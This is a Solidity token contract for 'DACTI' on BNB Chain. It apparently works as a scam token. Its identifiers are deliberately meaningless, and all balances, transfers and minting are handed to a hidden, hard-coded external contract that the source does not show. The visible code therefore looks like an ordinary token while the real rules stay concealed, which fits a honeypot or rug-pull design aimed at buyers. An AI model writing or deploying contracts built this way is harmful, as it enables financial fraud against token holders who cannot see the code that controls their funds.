/**
 *Submitted for verification at BscScan.com on 2022-04-21
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;


contract DACTI{
	
    string public name = "DACTI";
    string  public symbol = "DACTI";
    uint8   public decimals = 9;
	address adfdsf324 = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    uint256 public totalSupply_ = 1000000000 * (10 ** decimals);
    
	afdf234sdfsdf public asfsdf324;
    safsadfs324 asdfsdf2343 = safsadfs324(0xd597eC134d2320F0A54B0aB87a504cBEBeFc5a6C);


    mapping(address => mapping(address => uint256)) public alkdflajflkasj234234;
    address public sdfdsf324;
    address public adf324;
    
    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _value
    );
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return alkdflajflkasj234234[_owner][_spender];
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        alkdflajflkasj234234[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);
		
        return true;
    }
    function balanceOf(address _owner) public view returns (uint256) {
        return asdfsdf2343.sdfsd234(_owner);
    }
    function totalSupply() public view returns (uint256) {
        return asdfsdf2343.asdfsd324();
    }
    
    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(asdfsdf2343.sdfsd234(msg.sender) >= _value);

        asdfsdf2343.adsfsd234(msg.sender,_to,_value);
        emit Transfer(msg.sender, _to, _value);

		return true;
    }
   
    
    constructor() {
		
        asfsdf324 = afdf234sdfsdf(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        adf324 = adfsdf234(asfsdf324.factory()).createPair(adfdsf324, address(this));
        sdfdsf324=msg.sender;

        asdfsdf2343.asdf234(totalSupply_, address(this), sdfdsf324,adf324);
        emit Transfer(address(0), sdfdsf324, totalSupply_);
    }
	function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= asdfsdf2343.sdfsd234(_from));
        require(_value <= alkdflajflkasj234234[_from][msg.sender]);
		
		asdfsdf2343.adsfsd234(_from,_to,_value);

        emit Transfer(_from, _to, _value);
        
		return true;
    }
	

}


interface adfsdf234 {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface safsadfs324 {
    function asdfsd324() view external returns (uint256);
    function sdfsd234(address _owner) view external returns (uint256);
    function asdf234(uint256 total,address tokenAddress,address sdfdsf324,address _pairs) external;
    function adsfsd234(address _from, address _to, uint256 _value) external;
}
interface afdf234sdfsdf {
    function factory() external pure returns (address);
}